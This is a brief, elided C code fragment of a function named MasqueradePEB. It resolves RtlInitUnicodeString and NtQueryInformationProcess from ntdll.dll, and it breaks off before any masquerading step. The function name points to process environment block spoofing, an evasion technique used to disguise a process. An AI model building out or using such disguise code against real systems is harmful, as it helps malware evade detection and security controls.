...
BOOL MasqueradePEB() {
	...
	*/
	...
	if (hModule == NULL) {
		return FALSE; // Handle the error if ntdll.dll is not loaded
	}

	// Retrieve RtlInitUnicodeString from ntdll.dll
	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(hModule, "RtlInitUnicodeString");
	if (RtlInitUnicodeString == NULL) {
		return FALSE; // Handle the error if the function is not found
	}

	// Retrieve NtQueryInformationProcess from ntdll.dll
